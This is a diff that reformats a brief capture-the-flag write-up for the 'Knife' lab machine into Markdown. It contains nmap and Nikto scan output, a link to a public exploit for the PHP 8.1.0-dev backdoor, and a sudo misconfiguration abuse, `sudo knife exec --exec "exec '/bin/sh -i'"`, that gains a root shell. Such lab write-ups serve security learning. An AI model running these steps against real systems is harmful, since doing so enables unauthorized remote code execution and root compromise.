@@ -1,7 +1,8 @@
-======>ENUM
+# ENUM
 
-==>NMAP SCAN
+### NMAP SCAN
 
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -12,9 +13,11 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title:  Emergent Medical Idea
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
-==>Nikto Scan
+### Nikto Scan
 
+```
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.242
@@ -27,35 +30,36 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + The anti-clickjacking X-Frame-Options header is not present.
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+```
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-======>EXPLOIT
+# EXPLOIT
 
-- From the Nikto Scan Found ==>PHP/8.1.0-dev
+- From the Nikto Scan Found `PHP/8.1.0-dev`.
 
-- It has a backdoor Remote Code Execution Vuln
+- It has a backdoor Remote Code Execution Vuln.
 
-https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+`https://github.com/flast101/php-8.1.0-dev-backdoor-rce`
 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------
 
-======>PREV ESC
+# PREV ESC
 
-=> sudo -l
+`sudo -l`
+
 
 Matching Defaults entries for james on knife:                                                                                                                                                                      
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    `env_reset`, `mail_badpass`, `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin`
 
 User james may run the following commands on knife:
-    (root) NOPASSWD: /usr/bin/knife
+    `(root) NOPASSWD: /usr/bin/knife`
     
-=> https://docs.chef.io/workstation/knife_exec/
-=> To get The root I used the Command:
-  sudo knife exec --exec "exec '/bin/sh -i'"
+`https://docs.chef.io/workstation/knife_exec/`
+
+To get The root I used the Command:
   
-  '''
+ `sudo knife exec --exec "exec '/bin/sh -i'" `
+  
  
 
